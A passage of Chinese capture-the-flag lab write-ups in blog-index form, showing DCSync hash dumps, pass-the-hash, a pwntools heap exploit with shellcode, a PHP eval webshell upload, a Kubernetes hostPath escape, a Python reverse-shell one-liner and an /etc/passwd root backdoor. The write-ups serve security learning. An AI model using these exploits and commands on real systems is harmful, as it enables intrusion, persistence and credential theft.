C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag03.txt</span><br><span class=\"line\"> ________  __                                        </span><br><span class=\"line\">|_   __  |[  |                                       </span><br><span class=\"line\">  | |_ \\_| | |  ,--.   _ .--.  __   _   _ .--..--.   </span><br><span class=\"line\">  |  _|    | | &#96;&#39;_\\ : [ &#96;&#x2F;&#39;&#96;\\][  | | | [ &#96;.-. .-. |  </span><br><span class=\"line\"> _| |_     | | &#x2F;&#x2F; | |, | |     | \\_&#x2F; |, | | | | | |  </span><br><span class=\"line\">|_____|   [___]\\&#39;-;__&#x2F;[___]    &#39;.__.&#39;_&#x2F;[___||__||__] </span><br><span class=\"line\"></span><br><span class=\"line\">flag03: flag&#123;62316bc0-e19b-499d-8916-8ba504c4d05a&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524025629706.png\" alt=\"image-20250524025629706\"></p>\n<h1 id=\"后门用户组DCSync\"><a href=\"#后门用户组DCSync\" class=\"headerlink\" title=\"后门用户组DCSync\"></a>后门用户组DCSync</h1><p>由于 FILESERVER$ 为 DOMAIN CONTROLLERS 和 ENTERPRISE DOMAIN CONTROLLERS 组成员，所以可以直接dcsync，但是在这之前需要获取 FILESERVER$ 的凭证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump xiaorang.lab&#x2F;administrator@FILESERVER.xiaorang.lab -target-ip 172.22.60.42 -no-pass -k</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524023552350.png\" alt=\"image-20250524023552350\"></p>\n<p>之后Dcsync导出域内hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ impacket-secretsdump &#39;xiaorang.lab&#x2F;Fileserver$@DC.xiaorang.lab&#39; -target-ip 172.22.60.8 -dc-ip 172.22.60.8 -hashes :951d8a9265dfb652f42e5c8c497d70dc -just-dc-ntlm -user-status</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b::: (status&#x3D;Enabled)</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status&#x3D;Disabled)</span><br><span class=\"line\">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98194d49adfe247020eaade4a3936d95::: (status&#x3D;Disabled)</span><br><span class=\"line\">chenfang:1105:aad3b435b51404eeaad3b435b51404ee:302b5743b0f7b3436591aedf550ded5b::: (status&#x3D;Enabled)</span><br><span class=\"line\">zhanghao:1106:aad3b435b51404eeaad3b435b51404ee:4c37e7a022daf856bfa2b16824696ab5::: (status&#x3D;Enabled)</span><br><span class=\"line\">wangyun:1107:aad3b435b51404eeaad3b435b51404ee:561d64b9a1c943db32810fb5586a4be9::: (status&#x3D;Enabled)</span><br><span class=\"line\">zhangwei:1108:aad3b435b51404eeaad3b435b51404ee:3d2f864635abb31f2546dc07cbcd2528::: (status&#x3D;Enabled)</span><br><span class=\"line\">wangkai:1109:aad3b435b51404eeaad3b435b51404ee:d20a47a4529552805d96a24c3020384c::: (status&#x3D;Enabled)</span><br><span class=\"line\">yangyan:1110:aad3b435b51404eeaad3b435b51404ee:4f80f967fd586f4212bc264a7d1f6789::: (status&#x3D;Enabled)</span><br><span class=\"line\">zhangxin:1111:aad3b435b51404eeaad3b435b51404ee:38780e101b28bb9b9036fc3e2e4f35e6::: (status&#x3D;Enabled)</span><br><span class=\"line\">wangping:1112:aad3b435b51404eeaad3b435b51404ee:0adf6fb0f808be95d449e3b6c67b02dc::: (status&#x3D;Enabled)</span><br><span class=\"line\">DC$:1000:aad3b435b51404eeaad3b435b51404ee:44dda5740d05157ef690ab64f2f15090::: (status&#x3D;Enabled)</span><br><span class=\"line\">PC1$:1103:aad3b435b51404eeaad3b435b51404ee:7f985abfa3cf6359772a724fe8085eb5::: (status&#x3D;Enabled)</span><br><span class=\"line\">FILESERVER$:1114:aad3b435b51404eeaad3b435b51404ee:951d8a9265dfb652f42e5c8c497d70dc::: (status&#x3D;Enabled)</span><br><span class=\"line\">TEST$:1116:aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72::: (status&#x3D;Enabled)</span><br><span class=\"line\">[*] Cleaning up... </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524023808674.png\" alt=\"image-20250524023808674\"></p>\n<h1 id=\"PTH\"><a href=\"#PTH\" class=\"headerlink\" title=\"PTH\"></a>PTH</h1><p>PTH PC1、DC</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ impacket-wmiexec xiaorang.lab&#x2F;Administrator@172.22.60.8 -hashes :c3cfdc08527ec4ab6aa3e630e79d349b -codec GBK -shell-type powershell</span><br><span class=\"line\"></span><br><span class=\"line\">$ impacket-wmiexec xiaorang.lab&#x2F;Administrator@172.22.60.15 -hashes :c3cfdc08527ec4ab6aa3e630e79d349b -codec GBK -shell-type powershell</span><br></pre></td></tr></table></figure>\n\n","categories":["云境靶场"]},{"title":"春秋云境-GreatWall","url":"/2025/05/26/GreatWall/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/5b52d2dc87d114859450db9df824843a.png\" style=\"zoom:67%;\" />\n\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、k8s未授权：<a href=\"https://zone.huoxian.cn/d/1153-k8s\">浅析K8S各种未授权攻击方法</a></p>\n<h1 id=\"拓扑\"><a href=\"#拓扑\" class=\"headerlink\" title=\"拓扑\"></a>拓扑</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250525231418330.png\" alt=\"image-20250525231418330\"></p>\n<h1 id=\"flag1\"><a href=\"#flag1\" class=\"headerlink\" title=\"flag1\"></a>flag1</h1><p>TP5 RCE，fscan</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] ftp 172.28.23.26:21:anonymous </span><br><span class=\"line\">   [-&gt;]OASystem.zip</span><br><span class=\"line\"></span><br><span class=\"line\">[+] PocScan http:&#x2F;&#x2F;172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file </span><br><span class=\"line\">[+] PocScan http:&#x2F;&#x2F;172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"flag3\"><a href=\"#flag3\" class=\"headerlink\" title=\"flag3\"></a>flag3</h1><p>heapdump + shiro</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;172.28.23.33:8080&#x2F;actuator&#x2F;heapdump</span><br></pre></td></tr></table></figure>\n\n<p>发现key，AES模式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AZYyIgMYhG6&#x2F;CzIJlvpR2g&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>\n\n<p>发现高端口 59696 运行了一个elf：/home/ops01/HashNote，pwn一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf &#x3D; ELF(&#39;.&#x2F;HashNote&#39;)</span><br><span class=\"line\">context(arch&#x3D;elf.arch, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)</span><br><span class=\"line\"># p &#x3D; process(&#39;.&#x2F;HashNote&#39;)</span><br><span class=\"line\">p &#x3D; remote(&#39;172.28.23.33&#39;, 59696)</span><br><span class=\"line\"></span><br><span class=\"line\">def send_command(command):</span><br><span class=\"line\">    p.sendlineafter(&#39;: &#39;, str(command))</span><br><span class=\"line\"></span><br><span class=\"line\">def add_entry(key, value):</span><br><span class=\"line\">    send_command(1)</span><br><span class=\"line\">    p.sendlineafter(&#39;Key: &#39;, key)</span><br><span class=\"line\">    p.sendlineafter(&#39;Data: &#39;, value)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_entry(key):</span><br><span class=\"line\">    send_command(2)</span><br><span class=\"line\">    p.sendlineafter(&#39;Key: &#39;, key)</span><br><span class=\"line\"></span><br><span class=\"line\">def update_entry(key, value):</span><br><span class=\"line\">    send_command(3)</span><br><span class=\"line\">    p.sendlineafter(&#39;Key: &#39;, key)</span><br><span class=\"line\">    p.sendlineafter(&#39;Data: &#39;, value)</span><br><span class=\"line\"></span><br><span class=\"line\">def set_username(value):</span><br><span class=\"line\">    send_command(4)</span><br><span class=\"line\">    p.sendafter(&#39;New username: &#39;, value)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#39;Username: &#39;, &#39;123&#39;)</span><br><span class=\"line\">p.sendlineafter(&#39;Password: &#39;, &#39;freep@ssw0rd:3&#39;)</span><br><span class=\"line\"></span><br><span class=\"line\">add_entry(&#39;aabP&#39;, &#39;aaaaaaaa&#39;)</span><br><span class=\"line\">add_entry(&#39;aace&#39;, &#39;C&#39; * 0xc0)</span><br><span class=\"line\"></span><br><span class=\"line\">sc &#x3D; [</span><br><span class=\"line\">    &#39;\\x6a\\x3b&#39;,                   # push   0x3b</span><br><span class=\"line\">    &#39;\\x58&#39;,                       # pop    rax</span><br><span class=\"line\">    &#39;\\x99&#39;,                       # cdq</span><br><span class=\"line\">    &#39;\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68&#39;, # movabs rbx, 0x68732f6e69622f2f</span><br><span class=\"line\">    &#39;\\x53&#39;,                       # push   rbx</span><br><span class=\"line\">    &#39;\\x48\\x89\\xe7&#39;,               # mov    rdi, rsp</span><br><span class=\"line\">    &#39;\\x52&#39;,                       # push   rdx</span><br><span class=\"line\">    &#39;\\x57&#39;,                       # push   rdi</span><br><span class=\"line\">    &#39;\\x48\\x89\\xe6&#39;,               # mov    rsi, rsp</span><br><span class=\"line\">    &#39;\\x0f\\x05&#39;                    # syscall</span><br><span class=\"line\">]</span><br><span class=\"line\">shellcode &#x3D; b&#39;&#39;.join(sc)</span><br><span class=\"line\">username_addr &#x3D; 0x5dc980</span><br><span class=\"line\">fake_obj_addr &#x3D; username_addr + 0x10</span><br><span class=\"line\"></span><br><span class=\"line\">def arbitrary_read(addr):</span><br><span class=\"line\">    payload &#x3D; p64(fake_obj_addr)</span><br><span class=\"line\">    payload +&#x3D; p64(0xdeadbeef)</span><br><span class=\"line\"></span><br><span class=\"line\">    fake_obj &#x3D; p64(fake_obj_addr + 0x10) + p64(4)</span><br><span class=\"line\">    fake_obj +&#x3D; &#39;aahO&#39;.ljust(0x10, &#39;\\x00&#39;)</span><br><span class=\"line\">    fake_obj +&#x3D; p64(addr) + p64(8) + &#39;aaaaaaaa&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">    payload +&#x3D; fake_obj</span><br><span class=\"line\">    payload +&#x3D; shellcode</span><br><span class=\"line\">    payload &#x3D; payload.ljust(128, &#39;\\x00&#39;)</span><br><span class=\"line\">    set_username(payload)</span><br><span class=\"line\">    get_entry(&#39;aahO&#39;)</span><br><span class=\"line\"></span><br><span class=\"line\">def arbitrary_write(addr, data):</span><br><span class=\"line\">    payload &#x3D; p64(fake_obj_addr)</span><br><span class=\"line\">    payload +&#x3D; p64(0xdeadbeef)</span><br><span class=\"line\">    fake_obj &#x3D; p64(fake_obj_addr + 0x10) + p64(4)</span><br><span class=\"line\">    fake_obj +&#x3D; &#39;aahO&#39;.ljust(0x10, &#39;\\x00&#39;)</span><br><span class=\"line\">    fake_obj +&#x3D; p64(addr) + p64(len(data)) + &#39;aaaaaaaa&#39;</span><br><span class=\"line\">    payload +&#x3D; fake_obj</span><br><span class=\"line\">    payload +&#x3D; shellcode</span><br><span class=\"line\">    payload &#x3D; payload.ljust(128, &#39;\\x00&#39;)</span><br><span class=\"line\">    set_username(payload)</span><br><span class=\"line\">    update_entry(&#39;aahO&#39;, data)</span><br><span class=\"line\"></span><br><span class=\"line\">environ &#x3D; 0x5e4c38 </span><br><span class=\"line\">arbitrary_read(environ)</span><br><span class=\"line\">stack_addr &#x3D; u64((p.recvuntil(&#39;\\x7f&#39;, drop&#x3D;False)[-6:].ljust(8, &#39;\\0&#39;)))</span><br><span class=\"line\">success(&#39;stack_addr&#39;, stack_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">rdi &#x3D; 0x0000000000405e7c</span><br><span class=\"line\">rsi &#x3D; 0x000000000040974f</span><br><span class=\"line\">rax &#x3D; 0x00000000004206ba</span><br><span class=\"line\">rdx_rbx &#x3D; 0x000000000053514b</span><br><span class=\"line\">shr_eax_2 &#x3D; 0x0000000000523f2e</span><br><span class=\"line\">syscall_ret &#x3D; 0x00000000004d9776</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; p64(rdi) + p64(username_addr &amp; ~0xfff) + p64(rsi) + p64(0x1000) + p64(rdx_rbx) + p64(7) + p64(0) + p64(rax) + p64(0xa &lt;&lt; 2) + p64(shr_eax_2) + p64(syscall_ret) + p64(username_addr + 0x48)</span><br><span class=\"line\"></span><br><span class=\"line\">arbitrary_write(stack_addr - 0x210, payload)</span><br><span class=\"line\">p.sendline(&#39;uname -ar&#39;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"flag2\"><a href=\"#flag2\" class=\"headerlink\" title=\"flag2\"></a>flag2</h1><p>ftp下载文件审计发现任意文件写shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -X POST -d &quot;imgbase64&#x3D;data:image&#x2F;php;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4&#x3D;&quot; &quot;http:&#x2F;&#x2F;172.28.23.26&#x2F;uploadbase64.php&quot;</span><br><span class=\"line\">&#123;&quot;src&quot;:&quot;upload&#x2F;2025-05-26-6834854461dbb.php&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>蚁剑 bypass df  + suid</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;base32 &#x2F;flag02.txt</span><br></pre></td></tr></table></figure>\n\n<p>双网卡 扫描 + 多层代理</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.22.14.37 K8s</span><br><span class=\"line\">172.22.14.46 Harbor</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"flag5\"><a href=\"#flag5\" class=\"headerlink\" title=\"flag5\"></a>flag5</h1><p>Harbor CVE-2022-46463未授权访问，查看所有镜像，下载secret镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python harbor.py http:&#x2F;&#x2F;172.22.14.46&#x2F; --dump harbor&#x2F;secret --v2</span><br></pre></td></tr></table></figure>\n\n<p>./caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt</p>\n<h1 id=\"flag6\"><a href=\"#flag6\" class=\"headerlink\" title=\"flag6\"></a>flag6</h1><p>下载projectadmin镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python harbor.py http:&#x2F;&#x2F;172.22.14.46&#x2F; --dump project&#x2F;projectadmin --v2</span><br></pre></td></tr></table></figure>\n\n<p>有个ProjectAdmin-0.0.1-SNAPSHOT.jar，解压看下配置文件发现mysql，UDF提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -d &quot;mysql:&#x2F;&#x2F;root:My3q1i4oZkJm3@172.22.10.28:3306&#x2F;mysql&quot; --os-shell </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250527005605820.png\" alt=\"image-20250527005605820\"></p>\n<h1 id=\"flag4\"><a href=\"#flag4\" class=\"headerlink\" title=\"flag4\"></a>flag4</h1><p>172.22.14.37 开放 10250 和 2379 端口，扫一下6443，存在 Kubernetes API server 未授权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;172.22.14.37:6443</span><br></pre></td></tr></table></figure>\n\n<p>下载：<a href=\"https://dl.k8s.io/release/v1.30.0/bin/windows/amd64/kubectl.exe\">https://dl.k8s.io/release/v1.30.0/bin/windows/amd64/kubectl.exe</a> </p>\n<p>列pod</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl.exe --insecure-skip-tls-verify -s https:&#x2F;&#x2F;172.22.14.37:6443&#x2F; get pods</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250527003456355.png\" alt=\"image-20250527003456355\"></p>\n<p>查看pod</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl.exe --insecure-skip-tls-verify -s https:&#x2F;&#x2F;172.22.14.37:6443&#x2F; describe pod nginx-deployment-58d48b746d-d6x8t</span><br></pre></td></tr></table></figure>\n\n<p>同样构造一个nginx的yaml用于挂载到宿主机的 <code>/</code> 路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apiVersion: apps&#x2F;v1</span><br><span class=\"line\">kind: Deployment</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: nginx-deployment</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    app: nginx</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  replicas: 1</span><br><span class=\"line\">  selector:</span><br><span class=\"line\">    matchLabels:</span><br><span class=\"line\">      app: nginx</span><br><span class=\"line\">  template:</span><br><span class=\"line\">    metadata:</span><br><span class=\"line\">      labels:</span><br><span class=\"line\">        app: nginx</span><br><span class=\"line\">    spec:</span><br><span class=\"line\">      containers:</span><br><span class=\"line\">      - name: nginx</span><br><span class=\"line\">        image: nginx:1.8</span><br><span class=\"line\">        volumeMounts:</span><br><span class=\"line\">        - mountPath: &#x2F;mnt</span><br><span class=\"line\">          name: test-volume</span><br><span class=\"line\">      volumes:</span><br><span class=\"line\">      - name: test-volume</span><br><span class=\"line\">        hostPath:</span><br><span class=\"line\">          path: &#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>部署pod</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl.exe --insecure-skip-tls-verify -s https:&#x2F;&#x2F;172.22.14.37:6443&#x2F; apply -f evil.yaml</span><br></pre></td></tr></table></figure>\n\n<p>列pod</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl.exe --insecure-skip-tls-verify -s https:&#x2F;&#x2F;172.22.14.37:6443&#x2F; get pods</span><br></pre></td></tr></table></figure>\n\n<p>进容器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl.exe --insecure-skip-tls-verify -s https:&#x2F;&#x2F;172.22.14.37:6443&#x2F; exec -it nginx-deployment-864f8bfd6f-szx96 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n\n<p>写ssh公钥</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -b 4096</span><br><span class=\"line\">echo &quot;ssh-rsa AAAAB3NzaC...&quot; &gt; &#x2F;mnt&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>\n\n<p>ssh连接，mysql找flag</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250527005210519.png\" alt=\"image-20250527005210519\"></p>\n","categories":["云境靶场"]},{"title":"春秋云境-Hospital","url":"/2025/03/02/Hospital/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/d9d4a76aef006dded778ca9e4e78bfac.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、sudo -l</p>\n<p>此处利用的是linux提权中的SUDO提权，sudo -l 结果意味着 postgres用户可以在不输入密码的情况下，通过 sudo 提升权限执行 /usr/local/postgresql/bin/psql 这个命令。并且，它不限制执行者的身份——postgres 用户可以以任何其他用户身份（包括 root）执行此命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">postgres@web04:&#x2F;usr&#x2F;local&#x2F;pgsql&#x2F;data$ sudo -l</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Matching Defaults entries for postgres on web04:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;bin</span><br><span class=\"line\"></span><br><span class=\"line\">User postgres may run the following commands on web04:</span><br><span class=\"line\">    (ALL) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;postgresql&#x2F;bin&#x2F;psql</span><br></pre></td></tr></table></figure>\n\n<p>二、为什么需要改掉数据库root用户密码</p>\n<p>postgres用户以sudo执行psql命令后，会以系统root身份去启动psql，在进入psql身份认证时，psql就会需要数据库内root用户的密码进行认证。如果不改root用户密码，可以指定认证用户。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo &#x2F;usr&#x2F;local&#x2F;postgresql&#x2F;bin&#x2F;psql -U postgres</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"入口\"><a href=\"#入口\" class=\"headerlink\" title=\"入口\"></a>入口</h1><p>ip：39.101.133.214</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">39.101.133.214:22 open</span><br><span class=\"line\">39.101.133.214:8080 open</span><br><span class=\"line\">[*] alive ports len is: 2</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;39.101.133.214:8080 code:302 len:0      title:None 跳转url: http:&#x2F;&#x2F;39.101.133.214:8080&#x2F;login;jsessionid&#x3D;ABE0BA65AA54FE8E82B699F1DC9D7DD9</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;39.101.133.214:8080&#x2F;login;jsessionid&#x3D;ABE0BA65AA54FE8E82B699F1DC9D7DD9 code:200 len:2005   title:医疗管理后台</span><br><span class=\"line\">[+] PocScan http:&#x2F;&#x2F;39.101.133.214:8080 poc-yaml-spring-actuator-heapdump-file</span><br></pre></td></tr></table></figure>\n\n<p>登录系统为shiro，存在heapdump，搜索发现以下信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">shiro key:</span><br><span class=\"line\">algMode &#x3D; CBC, key &#x3D; GAYysgMQhG7&#x2F;CzIJlVpR2g&#x3D;&#x3D;, algName &#x3D; AES</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;app&#x2F;login-1.0-SNAPSHOT.jar</span><br><span class=\"line\">&#x2F;home&#x2F;app</span><br></pre></td></tr></table></figure>\n\n<p>shiro attack 注入内存马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241129235809008.png\" alt=\"image-20241129235809008\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 172.30.12.5  netmask 255.255.0.0  broadcast 172.30.255.255</span><br><span class=\"line\">        inet6 fe80::216:3eff:fe16:52c5  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether 00:16:3e:16:52:c5  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 91433  bytes 77793846 (77.7 MB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 41370  bytes 70520990 (70.5 MB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 1146  bytes 99294 (99.2 KB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 1146  bytes 99294 (99.2 KB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>\n\n<p>没找到flag，suid提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;vim.basic</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;su</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;staprun</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;umount</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;stapbpf</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;fusermount</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;mount</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br></pre></td></tr></table></figure>\n\n<p>没找到vim.basic只有vim</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130001145086.png\" alt=\"image-20241130001145086\"></p>\n<p>利用python或msf反弹一个shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">交互shell</span><br><span class=\"line\">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130001320957.png\" alt=\"image-20241130001320957\"></p>\n<p>利用vim.basic的高权限往/etc/passwd中添加用户：hacker/123456</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl passwd -1 -salt 123 123456</span><br><span class=\"line\">vim.basic &#x2F;etc&#x2F;passwd</span><br><span class=\"line\">hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class=\"line\">:wq!</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130002910338.png\" alt=\"image-20241130002910338\"></p>\n<p>切换hacker</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130003128275.png\" alt=\"image-20241130003128275\"></p>\n<h1 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" 